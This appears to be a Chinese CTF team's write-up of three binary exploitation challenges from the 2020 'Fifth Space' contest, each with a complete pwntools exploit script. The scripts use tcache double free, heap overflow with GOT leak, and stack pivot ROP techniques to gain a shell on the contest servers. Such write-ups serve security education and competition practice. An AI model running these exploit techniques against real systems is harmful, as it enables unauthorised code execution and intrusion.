# “第五空间”网络安全挑战赛 2020


By X1do0@Lilac, wxk@Lilac

<!--more-->

![](https://i.loli.net/2020/06/25/JGF8WBDsAvMEfYr.png)

## of

这题给的C文件与服务器上不同，实际上远程的remove功能并没有清除堆存储cookie的位置...(葵佬透视挂实锤了)

所以是tcache入门题了...double free即可

```python
from pwn import *
from time import sleep
import sys
global io

context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
filename = "./of_27"
ip = "121.36.74.70"
port = 9999
LOCAL = True if len(sys.argv)==1 else False
elf = ELF(filename)

remote_libc = "./libc-2.27.so"
if LOCAL:
    io = process(filename)
    libc = elf.libc

else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)

def choice( idx):
    io.sendlineafter( "choice: ", str(idx))
    
def lg(name, val):
    log.info(name+" : "+hex(val))

def add( idx):
    choice( 1)
    io.sendlineafter( "Index: ", str(idx))
    io.recvuntil( "!\n")

def edit( idx, data):
    choice( 2)
    io.sendlineafter( "Index: ", str(idx))
    io.sendafter( "Content: ", data)

def show( idx):
    choice( 3)
    io.sendlineafter( "Index: ", str(idx))
    io.recvuntil( "Content: ")

def rm( idx):
    choice( 4)
    io.sendlineafter( "Index: ", str(idx))

add( 0)
add( 1)
rm( 0)
rm( 0)
show( 0)
heap_addr = u64(io.recv( 6) + '\0\0')
lg("heap_addr", heap_addr)

for i in range(6):
    rm( 0)
show( 0)
libc_addr = u64(io.recv( 6) + '\0\0')
libc.address = libc_addr -  (0x3afca0 if LOCAL else 0x3ebca0)

lg("heap_addr", heap_addr)
lg("libc_addr", libc_addr)
lg('libc base', libc.address)

edit( 0, p64(libc.symbols['__free_hook']))
add( 2)
add( 3)
edit( 3, p64(libc.symbols['system']))
edit( 2, "/bin/sh;\0")


rm( 2)   

io.interactive()
```

## pwnme

ARM智障堆题...环境装了一下午，头秃。1kb的库是文本文件，打开后手动软链接才能执行。

不是很懂ARM...找了个调试模板瞎试出来了，大概类似于`fastbin attack`吧，简单堆溢出

```python
from pwn import *
import sys
context.binary = "./a.out"

LOCAL = False

if not LOCAL:
    io = remote("121.36.58.215", 1337)
else:
    io = process(["qemu-arm", "-g", "8080", "./a.out"])

elf = ELF("./a.out")
libc = ELF("./lib/libuClibc-1.0.34.so")
context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

gds['chunk_info'] = 0x21068
gds['chunk_cnt'] = 0x2106C
gds['heap'] = 0x22010
 # add
# bps.append(0x10884) 
# free
# bps.append(0x10AA0)
# change  
# bps.append(0x109A4)
bps.append(0x106F0)


mydebug(io,"target remote localhost:8080")

def show():
	io.sendlineafter('>>> ','1')

def add(len,con):
	io.sendlineafter('>>> ','2')
	io.sendlineafter("Length:",str(len))
	io.sendafter("Tag:",con)

def change(idx,len,con):
	io.sendlineafter('>>> ','3')
	io.sendlineafter("Index:",str(idx))
	io.sendlineafter("Length:",str(len))
	io.sendafter("Tag:",con)

def remove(idx):
	io.sendlineafter('>>> ','4')
	io.sendlineafter("Tag:",str(idx))
	
add(0x18,'a'*8)
add(0x18,'b'*8)
add(0x18,'c'*8)
add(0x21,'d'*8)

remove(1)
remove(2)

pay1 = 'xxxx'*7 + p32(0x21)+ p32(0x22) + 'xxxx'*6 + p32(0x21) + p32(0x2107d)
pay2 = 'xxxx'*7 + p32(0x21)+ p32(0x21072)
change(0,0x70,pay2)
add(0x18,'g'*8)
add(0x18,'h'*8)
add(0x18,'i'*8)

pay3 = 'a'*0x10 + p32(4) + p32(elf.got['puts'])
change(4,len(pay3),pay3)

show()

io.recvuntil("0 : ")
puts_addr = u32(io.recv(4))
success("puts:"+hex(puts_addr))
libc_base = puts_addr-libc.sym['puts']
success("libc:"+hex(libc_base))
sys_addr = libc_base + libc.sym['system']

pay4 = 'a'*0x10 + p32(4) + p32(elf.got['free'])
change(4,len(pay4),pay4)
change(0,4,p32(sys_addr))
binsh = "/bin/sh\x00"
change(1,len(binsh),binsh)
remove(1)
io.interactive()
```

## twice

stack pivot花式rop技巧，利用两次`leave ret`通过修改rbp而控制rsp

```python
from pwn import *

context(arch = 'amd64', os = 'linux', endian = 'little')
io = remote("121.36.59.116", 9999)

main = 0x40087B
io.sendafter(">", "a"*0x59)
io.recvuntil("a"*0x59)
canary = u64('\0'+io.recv(7))
stack = u64(io.recv(6) + '\0\0')

plt_puts = 0x4005C0
plt_read = 0x4005F0
got_puts = 0x601020
got_read = 0x601038
PrdiR = 0x0000000000400923
PrsiPr15R = 0x0000000000400921
lr = 0x0000000000400879

rop = flat(
    PrdiR, got_puts,
    plt_puts, PrdiR, got_read,
    plt_puts, main,
)

pay2 = fit({
    0: 'wxktql' + '\0'*2,
    8:rop,
    0x58: flat(canary, stack-0x70, lr)
})

io.sendafter(">", pay2)
io.recvuntil('wxktql\n')

puts_addr = u64(io.recv(7)[:6] + '\0\0')
read_addr = u64(io.recv(7)[:6] + '\0\0')
libc_base = puts_addr - 0x06f690

io.sendafter(">", "wxktql\0")
io.recvuntil('wxktql\n')


io.sendafter(">", "a"*0x58 + p64(canary) + 'a'*8 + p64(libc_base+0x45216))

io.interactive()
```


